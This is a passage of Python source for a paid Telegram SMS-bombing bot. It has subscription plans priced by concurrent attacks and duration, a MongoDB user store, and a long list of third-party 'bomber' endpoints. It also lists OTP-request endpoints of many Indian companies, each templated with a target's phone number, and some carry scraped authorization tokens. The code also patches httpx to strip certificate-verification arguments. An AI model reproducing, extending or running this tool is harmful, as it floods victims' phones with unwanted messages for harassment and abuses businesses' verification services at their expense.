import os
import sys
import types
import json
import time
import random
import string
import asyncio
from datetime import datetime, timedelta

# ========== CGI MODULE FIX ==========
class CGI:
    def parse_multipart(self, *args, **kwargs):
        return {}
    class FieldStorage:
        def __init__(self, *args, **kwargs):
            self.value = None
            self.filename = None
            self.file = None
            self.type = None
            self.headers = {}
        def __getattr__(self, name):
            return None

cgi_module = types.ModuleType('cgi')
cgi_module.parse_multipart = CGI().parse_multipart
cgi_module.FieldStorage = CGI.FieldStorage
cgi_module.__dict__.update({
    'parse_multipart': CGI().parse_multipart,
    'FieldStorage': CGI.FieldStorage
})
sys.modules['cgi'] = cgi_module

# ========== HTTPX FIX ==========
import httpx
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)

_orig_async_init = httpx.AsyncClient.__init__
def _patched_async_init(self, *args, **kwargs):
    for p in ['proxy', 'proxies', 'http1', 'http2', 'verify', 'cert', 'trust_env']:
        kwargs.pop(p, None)
    try:
        _orig_async_init(self, *args, **kwargs)
    except TypeError:
        pass
httpx.AsyncClient.__init__ = _patched_async_init

_orig_sync_init = httpx.Client.__init__
def _patched_sync_init(self, *args, **kwargs):
    for p in ['proxy', 'proxies', 'http1', 'http2', 'verify', 'cert', 'trust_env']:
        kwargs.pop(p, None)
    try:
        _orig_sync_init(self, *args, **kwargs)
    except TypeError:
        pass
httpx.Client.__init__ = _patched_sync_init

# ========== IMPORTS ==========
import aiohttp
from aiohttp import web
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
from pymongo import MongoClient

# ========== ENV CONFIG (SAME AS YOUR FILE) ==========
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
OWNER_ID = int(os.environ.get("OWNER_ID", "0") or "0")
ADMIN_ID = int(os.environ.get("ADMIN_ID", "0") or "0")
WELCOME_IMAGE = "https://i.postimg.cc/YCxyLJC7/file-000000001744820a98f207c5da99d202.png"

MONGO_URL = os.environ.get("MONGO_URL", "")
DB_NAME = os.environ.get("DB_NAME", "bomber_db")

if not MONGO_URL:
    print("❌ MONGO_URL environment variable set nahi hai!")
    sys.exit(1)

mongo_client = MongoClient(MONGO_URL, serverSelectionTimeoutMS=5000)
db = mongo_client[DB_NAME]
users_col = db["users"]
codes_col = db["redeem_codes"]

try:
    mongo_client.admin.command('ping')
    print("✅ MongoDB connected successfully!")
except Exception as e:
    print(f"❌ MongoDB connection failed: {e}")
    sys.exit(1)

PLANS = {
    "standard": {"name": "Standard", "price": 149, "days": 30, "concurrent": 2, "max_duration": 300},
    "premium": {"name": "Premium", "price": 249, "days": 30, "concurrent": 5, "max_duration": 720},
    "ultimate": {"name": "Ultimate", "price": 349, "days": 30, "concurrent": 10, "max_duration": 720}
}

# ========== PREMIUM EMOJI HELPER ==========
def pm(emoji_id, fallback):
    return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'

E_FIRE    = pm("5424972470023104089", "🔥")
E_ROCKET  = pm("5424726078370058952", "🚀")
E_DIAMOND = pm("5427168083074628963", "💎")
E_CROWN   = pm("5427168083074628963", "👑")
E_STAR    = pm("5433758796283268636", "⭐")
E_BOLT    = pm("5424972470023104089", "⚡")
E_TARGET  = pm("5424972470023104089", "🎯")
E_LOCK    = pm("5424972470023104089", "🛡")
E_CARD    = pm("5424972470023104089", "💳")
E_KEY     = pm("5424972470023104089", "🔑")
E_CHECK   = pm("5424972470023104089", "✅")
E_CROSS   = pm("5424972470023104089", "❌")
E_STOP    = pm("5424972470023104089", "🛑")
E_USER    = pm("5424972470023104089", "👤")
E_CHART   = pm("5424972470023104089", "📊")
E_TIME    = pm("5424972470023104089", "⏰")
E_BELL    = pm("5424972470023104089", "📢")

# ========== FULL API DATA (from merged.json — 250+ APIs) ==========
API_DATA = [
    # ---------- BOMBER APIS ----------
    {"n": "SPLEXXO ORIGINAL", "u": "https://splexxo1-2api.vercel.app/bomb?phone={phone}&key=SPLEXXO", "m": "GET"},
    {"n": "SPLEXXO BACKUP", "u": "https://splexxo-api.vercel.app/bomb?phone={phone}&key=SPLEXXO", "m": "GET"},
    {"n": "SPLEXXO 2", "u": "https://splexxo2-api.vercel.app/bomb?phone={phone}&key=SPLEXXO", "m": "GET"},
    {"n": "BOMBER OVAR", "u": "https://bomber-api-ovar.onrender.com/bomb/{phone}/20", "m": "GET"},
    {"n": "LMNX9 SPAM", "u": "https://lmnx9-sms-spam-v11.onrender.com/api1?number={phone}", "m": "GET"},
    {"n": "APU INKY", "u": "https://apu-inky.vercel.app/send?number={phone}", "m": "GET"},
    {"n": "BRUTAL 1", "u": "https://bomber-part-1.onrender.com/bomb", "m": "GET"},
    {"n": "BRUTAL 2", "u": "https://brutal-bomber-part-2.onrender.com/bomb", "m": "GET"},
    {"n": "ULTRA BRUTAL", "u": "https://ultra-brutal-bomber.onrender.com/bomb", "m": "GET"},
    {"n": "BOMBER 9EKV", "u": "https://bomber-apis-9ekv.onrender.com/bom?key=felix&num={phone}", "m": "GET"},
    {"n": "BOMBER PRO", "u": "https://bomber-pro.onrender.com/bomb?phone={phone}&key=shuvo&cycles=10", "m": "GET"},
    {"n": "FELIX XBOM", "u": "https://felix-xbom-wyt2.onrender.com/bom?key=demo&num={phone}", "m": "GET"},
    {"n": "MAHADEV", "u": "https://bomber-by-mahadev.paskhinpf9.workers.dev/?phone={phone}", "m": "GET"},
    {"n": "ULTIMATE BOMBER", "u": "https://ultimate-bomber.vercel.app/api/bomb?number={phone}", "m": "GET"},
    {"n": "MEGA BOMBER", "u": "https://mega-bomber.onrender.com/api?phone={phone}", "m": "GET"},
    {"n": "FURY BOMBER", "u": "https://fury-bomber.vercel.app/api/bomb?number={phone}", "m": "GET"},
    {"n": "BOMBAR 1", "u": "https://bombar-1.vercel.app/api/bom?number={phone}", "m": "GET"},
    {"n": "BOMBAR 2", "u": "https://bombar-api-2.vercel.app/all?number={phone}", "m": "GET"},
    {"n": "PANTHER AURA", "u": "https://panther-aura-bomber-999-blond.vercel.app/api?num={phone}&type=sms&workers=500", "m": "GET"},
    {"n": "PANTHER JS", "u": "https://pantherbomberjs.pantherxofficial1.workers.dev/api?num={phone}&type=sms&workers=500", "m": "GET"},
    {"n": "MIX ROOTX", "u": "https://mix-rootx-new.vercel.app/bomb?number={phone}&workers=500", "m": "GET"},
    {"n": "PANTHER V2", "u": "https://panther-v2-api.vercel.app/api?num={phone}&type=sms&workers=500", "m": "GET"},
    {"n": "PANTHER X2", "u": "https://panther-x2.vercel.app/api?num={phone}&type=sms&workers=500", "m": "GET"},
    {"n": "LAKHAN API", "u": "https://lakhan-api-bom.hb3284008.workers.dev/?phone={phone}&workers=5000", "m": "GET"},
    {"n": "KINGCC BOMBER", "u": "https://bomber.kingcc.qzz.io/bomb?key=urfaaan_omdivine&numbar={phone}&workers=5000", "m": "GET"},

    # ---------- HIGH VOLUME OTP ----------
    {"n": "ZERODHA", "u": "https://zerodha.com/account/registration.php", "m": "POST", "h": {"content-type": "application/json;charset=UTF-8", "origin": "https://zerodha.com"}, "d": {"mobile": "{phone}", "source": "zerodha", "partner_id": ""}},
    {"n": "AAKASH ANTHE", "u": "https://antheapi.aakash.ac.in/api/generate-lead-otp", "m": "POST", "h": {"content-type": "application/json", "x-client-id": "a6fbf1d2-27c3-46e1-b149-0380e506b763"}, "d": {"mobile_psid": "{phone}", "mobile_number": "", "activity_type": "aakash-myadmission", "webengageData": {"profile": "student", "whatsapp_opt_in": True, "method": "mobile"}}},
    {"n": "AAKASH iACST", "u": "https://antheapi.aakash.ac.in/examapi/generate_register_otp?mobile={phone}&exam_type=iACST", "m": "POST", "h": {"content-type": "application/json"}},
    {"n": "WOODENSTREET B", "u": "https://api.woodenstreet.com/api/v1/register", "m": "POST", "h": {"content-type": "application/json"}, "d": {"firstname": "Astres", "email": "abcdhbdgud77dd@gmail.com", "telephone": "{phone}", "password": "abcd@gmail.com#%fd", "isGuest": 0, "pincode": "110001"}},
    {"n": "BHARATLOAN", "u": "https://www.bharatloan.com/login-sbm", "m": "POST", "h": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest"}, "d": "mobile={phone}&current_page=login&is_existing_customer=2"},
    {"n": "ZOHO STORE", "u": "https://store.zoho.com/api/v1/partner/affiliate/sendotp?mobilenumber=91{phone}&countrycode=IN&country=india", "m": "POST", "h": {"Origin": "https://www.zoho.com", "Content-Length": "0"}},
    {"n": "BYJU'S FREE TRIAL", "u": "https://api.byjus.com/api/v1/generate-otp", "m": "POST", "h": {"content-type": "application/json"}, "d": {"phoneNumber": "{phone}", "page": "free-trial-classes"}},
    {"n": "WOODENSTREET A", "u": "https://www.woodenstreet.com/index.php?route=account/forgotten_popup", "m": "POST", "h": {"content-type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest"}, "d": "telephone={phone}&pincode=110086&city=NORTH+WEST+DELHI&state=DELHI&email=hdftysdrt%40gmail.com&password=%40Abvdthfuj&login=2"},
    {"n": "PINKNBLU", "u": "http://www.pinknblu.com/v1/auth/generate/otp", "m": "POST", "h": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest"}, "d": "_token=HvvCsMqCY6poDB4GYPd2DJxewZ6H6TWPMHt8hfEV&country_code=%2B91&phone={phone}"},
    {"n": "NOBROKER", "u": "https://www.nobroker.in/api/v1/account/user/otp/send?otpM=true", "m": "POST", "h": {"content-type": "application/x-www-form-urlencoded; charset=UTF-8"}, "d": "phone=%2B91{phone}"},
    {"n": "MEDIBUDDY", "u": "https://loginprod.medibuddy.in/unified-login/user/register", "m": "POST", "h": {"content-type": "application/json"}, "d": {"source": "medibuddyInWeb", "platform": "medibuddy", "phonenumber": "{phone}", "flow": "Retail-Login-Home-Flow", "idealLoginFlow": False, "advertiserId": "3893d117-b321-Lba9-815e-db63c64b112a"}},
    {"n": "BEYOUNG", "u": "https://www.beyoung.in/api/sendOtp.json", "m": "POST", "h": {"content-type": "application/json;charset=UTF-8", "visitor": "477701202435772"}, "d": {"username": "{phone}", "username_type": "mobile", "service_type": 0, "vid": "477701202435772"}},
    {"n": "ISTEER", "u": "https://mconnect.isteer.co/mconnect/login", "m": "POST", "h": {"app_platform": "mvaahna", "content-type": "application/json"}, "d": {"mobile_number": "+91{phone}"}},
    {"n": "GOMECHANIC", "u": "https://gomechanic.app/api/v2/send_otp", "m": "POST", "h": {"Content-Type": "application/json", "Authorization": "725ea1b774c3558a8ec01a8405334a6e50e1e822d9549d84b36a1d3bb9478a27"}, "d": {"number": "{phone}", "source": "website", "random_id": "K6z9b"}},
    {"n": "MPAANI LOVELOCAL", "u": "https://homedeliverybackend.mpaani.com/auth/send-otp", "m": "POST", "h": {"content-type": "application/json", "client-code": "vulpix"}, "d": {"phone_number": "{phone}", "role": "CUSTOMER"}},
    {"n": "XYLEM PENPENCIL", "u": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348", "m": "POST", "h": {"Content-Type": "application/json", "client-id": "64254d66be2a390018e6d348", "client-type": "WEB"}, "d": {"mobile": "{phone}", "countryCode": "+91", "firstName": "Anant Ambani"}},

    # ---------- SMS OTP APIS ----------
    {"n": "AGREVOLUTION", "u": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobile_number": "{phone}", "client_id": "kisan-app"}},
    {"n": "BREEZE", "u": "https://api.breeze.in/session/start", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phoneNumber": "{phone}", "authVerificationType": "otp", "device": {"id": "A1pKVEDhlv66KLtoYsml3", "platform": "Chrome", "type": "Desktop"}, "countryCode": "+91"}},
    {"n": "JOCKEY", "u": "https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phone}?whatsapp=true", "m": "GET", "h": {"origin": "https://www.jockey.in"}},
    {"n": "GOKWIK", "u": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "m": "POST", "h": {"content-type": "application/json", "gk-merchant-id": "19g6im8srkz9y", "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzUyNDY4NywiZXhwIjoxNzU3NTI0NzQ3fQ.xkq3U9_Z0nTKhidL6rZ-N8PXMJOD2jo6II-v3oCtVYo"}, "d": {"phone": "{phone}", "country": "IN"}},
    {"n": "GOKWIK PDP", "u": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "m": "POST", "h": {"content-type": "application/json", "gk-merchant-id": "19g6ilhzwnelw", "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc3MzMxODk3NiwiZXhwIjoxNzczMzE5MDM2fQ.JzLZU2gjI0EBtokMC08rF20PCf4nL-NxxmoxXzHb6Dc"}, "d": {"phone": "{phone}", "country": "IN"}},
    {"n": "REDCLIFFE", "u": "https://api.redcliffelabs.com/api/v1/notification/send_otp/?from=website&is_resend=false", "m": "POST", "h": {"content-type": "application/json"}, "d": {"phone_number": "{phone}", "short": True, "country_code": "+91", "medium": ""}},
    {"n": "PENPENCIL RESEND", "u": "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "m": "POST", "h": {"content-type": "application/json", "origin": "https://www.pw.live"}, "d": {"mobile": "{phone}", "organizationId": "5eb393ee95fab7468a79d189"}},
    {"n": "PENPENCIL REG", "u": "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189?smsType=0", "m": "POST", "h": {"content-type": "application/json", "origin": "https://www.pw.live"}, "d": {"mobile": "{phone}", "countryCode": "+91", "subOrgId": "SUB-PWLI000"}},
    {"n": "PENPENCIL STORE", "u": "https://api.penpencil.co/v1/users/get-otp", "m": "POST", "h": {"content-type": "application/json", "suborgid": "SUB-PWST002", "origin": "https://store.pw.live"}, "d": {"username": "{phone}", "countryCode": "+91", "organizationId": "5eb393ee95fab7468a79d189"}},
    {"n": "CITYMALL A", "u": "https://citymall.live/api/cl-user/auth/get-otp", "m": "POST", "h": {"Content-Type": "application/json", "Origin": "https://citymall.live"}, "d": {"phone_number": "{phone}"}},
    {"n": "CITYMALL B", "u": "https://citymall.live/api/cl-user/auth/get-otp", "m": "POST", "h": {"Content-Type": "application/json", "x-app-name": "WEB", "x-requested-with": "WEB"}, "d": {"phone_number": "{phone}"}},
    {"n": "CITYMALL WEB", "u": "https://citymall.live/web-api/auth/send-otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone_number": "{phone}"}},
    {"n": "LICIOUS", "u": "https://www.licious.in/api/login/signup", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"phone": "{phone}", "captcha_token": None}},
    {"n": "BISLERI", "u": "https://apis.bisleri.com/send-otp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"email": "user@gmail.com", "mobile": "{phone}"}},
    {"n": "OYO A", "u": "https://www.oyorooms.com/api/pwa/generateotp?locale=en", "m": "POST", "h": {"Content-Type": "text/plain;charset=UTF-8", "Origin": "https://www.oyorooms.com"}, "d": {"phone": "{phone}", "country_code": "+91", "nod": 4}},
    {"n": "OYO B", "u": "https://www.oyorooms.com/api/pwa/generateotp?locale=en", "m": "POST", "h": {"Content-Type": "text/plain;charset=UTF-8", "Origin": "https://www.oyorooms.com"}, "d": {"phone": "{phone}", "country_code": "+91", "nod": 4}},
    {"n": "BELLAVITA A", "u": "https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber={phone}", "m": "GET"},
    {"n": "BELLAVITA B", "u": "https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber={phone}&storeUrl=bellavita1.myshopify.com&resendingOtp=false", "m": "GET"},
    {"n": "KPN FRESH", "u": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.0.3", "m": "POST", "h": {"x-app-id": "32178bdd-a25d-477e-b8d5-60df92bc2587", "Content-Type": "application/json; charset=UTF-8"}, "d": {"phone_number": {"country_code": "+91", "number": "{phone}"}}},
    {"n": "KPN WA v1", "u": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6", "m": "POST", "h": {"x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "Content-Type": "application/json; charset=UTF-8"}, "d": {"notification_channel": "WHATSAPP", "phone_number": {"country_code": "+91", "number": "{phone}"}}},
    {"n": "KPN WEB v1", "u": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0", "m": "POST", "h": {"x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797", "Content-Type": "application/json"}, "d": {"phone_number": {"number": "{phone}", "country_code": "+91"}}},
    {"n": "KPN WA WEB", "u": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0", "m": "POST", "h": {"x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797", "Content-Type": "application/json"}, "d": {"phone_number": {"number": "{phone}", "country_code": "+91"}, "notification_channel": "WHATSAPP"}},
    {"n": "ADITYA BIRLA", "u": "https://udyogplus.adityabirlacapital.com/api/msme/Form/GenerateOTP", "m": "POST", "h": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest"}, "d": "MobileNumber={phone}&functionality=signup"},
    {"n": "MUTHOOT", "u": "https://www.muthootfinance.com/smsapi.php", "m": "POST", "h": {"content-type": "application/x-www-form-urlencoded; charset=UTF-8", "x-requested-with": "XMLHttpRequest"}, "d": "mobile={phone}&pin=XjtYYEdhP0haXjo3"},
    {"n": "GOPAYSENSE", "u": "https://api.gopaysense.com/users/otp", "m": "POST", "h": {"content-type": "application/json", "origin": "https://www.gopaysense.com"}, "d": {"phone": "{phone}"}},
    {"n": "IIFL", "u": "https://www.iifl.com/personal-loans?_wrapper_format=html&ajax_form=1&_wrapper_format=drupal_ajax", "m": "POST", "h": {"content-type": "application/x-www-form-urlencoded; charset=UTF-8", "x-requested-with": "XMLHttpRequest"}, "d": "apply_for=18&full_name=Adnvs+Signh&mobile_number={phone}&terms_and_condition=1&_drupal_ajax=1"},
    {"n": "BANKOPEN", "u": "https://v2-api.bankopen.co/users/register/otp", "m": "POST", "h": {"content-type": "application/json", "x-api-version": "3.1", "x-client-type": "Web"}, "d": {"username": "{phone}", "is_open_capital": 1}},
    {"n": "TATA CAP", "u": "https://retailonline.tatacapital.com/web/api/shaft/nli-otp/shaft-generate-otp/partner", "m": "POST", "h": {"content-type": "application/json"}, "d": {"header": {"authToken": "MTI4OjoxMDAwMDo6ZDBmN2I4MGNiODIyNWY2MWMyNzMzN2I3YmM0MmY0NmQ6OjZlZTdjYTcwNDkyMmZlOTE5MGVlMTFlZDNlYzQ2ZDVhOjpkdmJuR2t5QW5qUmV2OHV5UDdnVnEyQXdtL21HcUlCMUx2NVVYeG5lb2M0PQ==", "identifier": "nli"}, "body": {"mobileNumber": "{phone}"}}},
    {"n": "TATA CAP BL", "u": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobileNumber": "{phone}", "deviceOs": "Android", "sourceName": "MitayeFaasleWebsite"}},
    {"n": "TRADEINDIA APP", "u": "https://apis.tradeindia.com/app_login_api/login_app", "m": "POST", "h": {"content-type": "application/json", "client_remote_address": "10.0.2.16"}, "d": {"mobile": "+91{phone}"}},
    {"n": "KHATABOOK", "u": "https://api.khatabook.com/v1/auth/request-otp", "m": "POST", "h": {"x-kb-app-name": "khatabook", "x-kb-platform": "android", "Content-Type": "application/json; charset=UTF-8"}, "d": {"phone": "{phone}", "country_code": "+91", "app_signature": "wk+avHrHZf2"}},
    {"n": "ORANGE HEALTH", "u": "https://accounts.orangehealth.in/api/v1/user/otp/generate/", "m": "POST", "h": {"content-type": "application/json"}, "d": {"mobile_number": "{phone}", "customer_auto_fetch_message": True}},
    {"n": "JOBHAI", "u": "https://api.jobhai.com/auth/jobseeker/v3/send_otp", "m": "POST", "h": {"content-type": "application/json;charset=UTF-8", "device-id": "e97edd71-16a3-4835-8aab-c67cf5e21be1", "source": "WEB"}, "d": {"phone": "{phone}"}},
    {"n": "ASTROSAGE", "u": "https://varta.astrosage.com/sdk/registerAS?countrycode=91&phoneno={phone}&jsonpcall=1&operation_name=blank&_=1719472121119", "m": "GET"},
    {"n": "SPINNY", "u": "https://api.spinny.com/api/c/user/otp-request/v3/", "m": "POST", "h": {"content-type": "application/json", "platform": "web"}, "d": {"contact_number": "{phone}", "whatsapp": False, "code_len": 4, "expected_action": "login"}},
    {"n": "DREAM11", "u": "https://www.dream11.com/auth/passwordless/init", "m": "POST", "h": {"content-type": "application/json", "device": "pwa"}, "d": {"channel": "sms", "flow": "SIGNUP", "phoneNumber": "{phone}", "templateName": "default"}},
    {"n": "MYMA", "u": "https://portal.myma.in/custom-api/auth/generateotp", "m": "POST", "h": {"content-type": "application/json"}, "d": {"countrycode": "+91", "mobile": "91{phone}", "is_otpgenerated": False, "app_version": "-1"}},
    {"n": "FREEDO", "u": "https://api.freedo.rentals/customer/sendOtpForSignUp", "m": "POST", "h": {"content-type": "application/json", "x-client-id": "FREEDO"}, "d": {"email_id": "cokiwav528@avastu.com", "first_name": "Haiii", "mobile_number": "{phone}"}},
    {"n": "COSMOFEED", "u": "https://prod.api.cosmofeed.com/api/user/authenticate", "m": "POST", "h": {"content-type": "application/json"}, "d": {"phoneNumber": "{phone}", "countryCode": "+91", "data": {"email": "abcd2@gmail.com"}, "authScreen": "signup-screen", "userIsConvertingToCreator": False}},
    {"n": "EVITALRX", "u": "https://www.evitalrx.in:4000/v3/login/signup_sendotp", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"pharmacy_name": "hfhfjfgfhkf", "mobile": "{phone}", "email_id": "jhvd@gmail.com", "zip_code": "110086"}},
    {"n": "QUICKRIDE", "u": "https://pwa.getquickride.com/rideMgmt/probableuser/create/new", "m": "POST", "h": {"APP-TOKEN": "s16-q9fz-jy3p-rk", "Content-Type": "application/x-www-form-urlencoded"}, "d": "contactNo={phone}&countryCode=%2B91&appName=Quick%20Ride"},
    {"n": "CLOVIA", "u": "https://www.clovia.com/api/v4/signup/check-existing-user/?phone={phone}&isSignUp=true&is_otp=True", "m": "GET"},
    {"n": "KWIKFIX", "u": "https://admin.kwikfixauto.in/api/auth/signupotp/", "m": "POST", "h": {"content-type": "application/json"}, "d": {"phone": "{phone}"}},
    {"n": "BREVISTAY", "u": "https://www.brevistay.com/cst/app-api/login", "m": "POST", "h": {"content-type": "application/json", "brevi-channel": "DESKTOP_WEB"}, "d": {"is_otp": 1, "is_password": 0, "mobile": "{phone}"}},
    {"n": "HOURLYROOMS", "u": "https://web-api.hourlyrooms.co.in/api/signup/sendphoneotp", "m": "POST", "h": {"content-type": "application/json", "platform": "web-2.0.0"}, "d": {"phone": "{phone}"}},
    {"n": "MADRAS MANDI", "u": "https://api.madrasmandi.in/api/v1/auth/otp", "m": "POST", "h": {"content-type": "multipart/form-data; boundary=----WebKitFormBoundaryBBzDmO8qIRlvPMMZ", "delivery-type": "instant"}, "d": "------WebKitFormBoundaryBBzDmO8qIRlvPMMZ\r\nContent-Disposition: form-data; name=\"phone\"\r\n\r\n+91{phone}\r\n------WebKitFormBoundaryBBzDmO8qIRlvPMMZ--\r\n"},
    {"n": "PAGARBOOK", "u": "https://api.pagarbook.com/api/v5/auth/otp/request", "m": "POST", "h": {"content-type": "application/json", "clientplatform": "WEB", "userrole": "EMPLOYER"}, "d": {"phone": "{phone}", "language": 1}},
    {"n": "VAHAK", "u": "https://api.vahak.in/v1/u/o_w", "m": "POST", "h": {"content-type": "application/json"}, "d": {"phone_number": "{phone}", "scope": 0, "is_whatsapp": False}},
    {"n": "IXIGO", "u": "https://www.ixigo.com/api/v5/oauth/dual/mobile/send-otp", "m": "POST", "h": {"apikey": "ixiweb!2$", "clientid": "ixiweb", "content-type": "application/x-www-form-urlencoded", "deviceid": "dc8e7b027263440b83a8"}, "d": "sixDigitOTP=true&prefix=%2B91&resendOnWhatsapp=false&phone={phone}"},
    {"n": "55CLUB", "u": "https://api.55clubapi.com/api/webapi/SmsVerifyCode", "m": "POST", "h": {"content-type": "application/json;charset=UTF-8"}, "d": {"phone": "91{phone}", "codeType": 1, "language": 0, "random": "35ae48f136d74b279dbd0eeb2504e7f8", "signature": "78A2879A0D46B65D257F9B29354B5DBA", "timestamp": 1715445820}},

    # ---------- E-COMMERCE / SHOPPING ----------
    {"n": "MYNTRA", "u": "https://www.myntra.com/gateway/v1/auth/getotp", "m": "POST", "h": {"content-type": "application/json", "x-myntraweb": "Yes", "x-requested-with": "browser", "deviceid": "8b9a6835-e2e0-42ec-9e0f-290e5e7e5a6f"}, "d": {"phoneNumber": "{phone}", "signup": "ONECLICK"}},
    {"n": "MEESHO", "u": "https://www.meesho.com/api/v1/user/login/request-otp", "m": "POST", "h": {"content-type": "application/json", "meesho-iso-country-code": "IN"}, "d": {"phone_number": "{phone}"}},
    {"n": "FLIPKART", "u": "https://2.rome.api.flipkart.com/api/7/user/otp/generate", "m": "POST", "h": {"content-type": "application/json", "x-user-agent": "Mozilla/5.0 Chrome/145.0.0.0 FKUA/website/42/website/Desktop"}, "d": {"loginId": "+91{phone}"}},
    {"n": "FLIPKART v5", "u": "https://www.flipkart.com/api/5/user/otp/generate", "m": "POST", "h": {"Content-Type": "application/x-www-form-urlencoded", "X-user-agent": "Mozilla/5.0 Firefox/66.0 FKUA/website/41/website/Desktop"}, "d": "loginId=+91{phone}"},
    {"n": "FLIPKART 1ROME", "u": "https://1.rome.api.flipkart.com/1.rome/api/1/action/view", "m": "POST", "h": {"content-type": "application/json", "x-user-agent": "Mozilla/5.0 Chrome/150.0.0.0 FKUA/website/42/website/Desktop"}, "d": {"loginId": "+91{phone}"}},
    {"n": "FLIPKART JB", "u": "https://rome.api.flipkart.com/api/7/user/otp/generate", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"loginId": "+91{phone}", "supportAllStates": True}},
    {"n": "AJIO LOGIN", "u": "https://login.web.ajio.com/api/auth/generateLoginOTP", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"mobileNumber": "{phone}"}},
    {"n": "AJIO SIGNUP", "u": "https://login.web.ajio.com/api/auth/signupSendOTP", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"firstName": "hgr", "genderType": "Male", "login": "myolnir123@gmail.com", "mobileNumber": "{phone}", "newDesign": False, "requestType": "SENDOTP", "rilFnlRegisterReferralCode": ""}},
    {"n": "SNAPDEAL EXIST", "u": "https://www.snapdeal.com/isUserExists", "m": "POST", "h": {"content-type": "application/json", "x-requested-with": "XMLHttpRequest"}, "d": {"userName": "{phone}"}},
    {"n": "SNAPDEAL SIGNUP", "u": "https://www.snapdeal.com/signupAjax/", "m": "POST", "h": {"Content-Type": "application/json"}, "d": {"j_number": "{phone}", "j_username": "mrkjan@ggail.com", "j_name": "rihan lovely", "j_dob": "25/06/1995", "j_password": "dlRS@123"}},
    {"n": "MOGLIX", "u": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP", "m": "POST", "h": {"content-type": "application/json"}, "d": {"email": "", "phone": "{phone}", "type": "p", "source": "signup", "buildVersion": "DESKTOP-7.3", "device": "desktop"}},
    {"n": "TATA 1MG", "u": "https://www.1mg.com/pwa-dweb-api/auth/create_token", "m": "POST", "h": {"content-type": "application/json", "x-access-key": "1mg_client_access_key"}, "d": {"phone": "{phone}"}},
    {"n": "BIGBASKET", "u": "https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/", "m": "POST", "h": {"content-type": "application/json", "x-channel": "BB-PWA"}, "d": {"identifier": "{phone}"}},
    {"n": "ZEPTO", "u": "https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/", "m": "POST", "h": {"content-type": "application/json; charset=UTF-8", "app_version": "16.17.0", "platform": "WEB", "tenant": "ZEPTO"}, "d": {"mobileNumber": "{phone}", "countryCode": "+91"}},
    {"n": "JIOMART", "u": "https://api.account.relianceretail.com/service/application/retail-auth/v2.0/send-otp", "m": "POST", "h": {"content-type": "application/json"}, "d": {"mobile": "{phone}"}},
    {"n": "BLINKIT", "u": "https://blinkit.com/v2/accounts/", "m": "POST", "h": {"Content-Type": "application/x-www-form-urlencoded", "auth_key": "c761ec3633c22afad934fb17a66385c1c06c5472b4898b866b7306186d0bb477"}, "d": "user_phone={phone}"},
    {"n": "GROFERS", "u": "https://grofers.com/v2/accounts/", "m": "POST", "h": {"Content-Type": "application/x-www-form-urlencoded", "auth_key": "3f0b81a721b2c430b145ecb80cfdf51b170bf96135574e7ab7c577d24c45dbd7"}, "d": "user_phone={phone}"},
    {"n": "NYKAA", "u": "https://www.nykaa.com/app-api/index.php/customer/send_otp", "m": "POST", "h": {"Content-Type": "application/x-www-form-urlencoded"}, "d": "source=sms&app_version=3.0.9&mobile_number={phone}&platform=ANDROID&domain=nykaa"},
    {"n": "WROGN", "u": "https://omqkhavcch.execute-api.ap-south-1.amazonaws.com/simplyotplogin/v5/otp", "m": "POST", "h": {"action": "sendOTP", "content-type": "application/json", "shop_name": "wrogn-website.myshopify.com"}, "d": {"username": "+91{phone}", "type": "mobile", "domain": "wrogn.com"}},
    {"n": "MEDKART", "u": "https://app.medkart.in/api/v1/auth/requestOTP?uuid=f9e75a95-e172-4922-b69c-08e1e3be9f1b", "m": "POST", "h": {"content-type": "application/json", "app-platform": "web"}, "d": {"mobile_no": "{phone}"}},
